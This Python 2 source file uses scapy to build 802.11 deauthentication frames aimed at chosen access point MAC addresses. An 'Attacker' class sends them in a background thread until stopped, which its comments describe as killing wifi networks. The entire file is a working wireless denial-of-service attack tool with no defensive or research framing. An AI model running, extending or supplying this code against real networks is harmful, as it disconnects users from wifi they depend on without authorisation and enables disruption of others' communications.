import threading
import Queue

import scapy.all

# function to make a packet given the 
#   MAC address of the access point
def makePacket(access_point,client="ff:ff:ff:ff:ff:ff"):
    return scapy.all.RadioTap()/scapy.all.Dot11(addr1=client, addr2=access_point, addr3=access_point)/scapy.all.Dot11Deauth()

class Attacker(object):
    def __init__(self,iface):
        # list of packets targeting MAC address
        self.targets = []

        self.queue = Queue.Queue()
        self.killThread = threading.Event()

        # interface to use to send the packets
        self.iface = iface

    # target function for thread to kill wifi networks
    #   @param event - a threading.Event(), allowing the thread to be stopped
    #       by calling self.killThread.set()
    #   @param queue - queue allows communication between 
    #       master and slave threads
    def sendDeauthPackets(self,event,queue):
        targets = []
        while not event.isSet():
            if not queue.empty():
                targets = queue.get()

            for packet in targets:
                scapy.all.sendp(packet, iface=self.iface, count=1, inter=.2, verbose=0)

    # updates the queue
    #   @param newList - list of MAC address to target
    #       note: to add a new addreses, you must pass in a list containing all
    #           addresses to target
    def updateQueue(self,newList):
        print "Targeting: " + str(newList)
        self.targets = [makePacket(access_point=target) for target in newList]
        self.queue.put(self.targets)

    def startAttack(self):
        self.killThread.clear()
        self.thread = threading.Thread(target=self.sendDeauthPackets,args=(self.killThread,self.queue))
        self.thread.start()

    def stopAttack(self):
        self.killThread.set()
        self.thread.join()
        self.targets = []

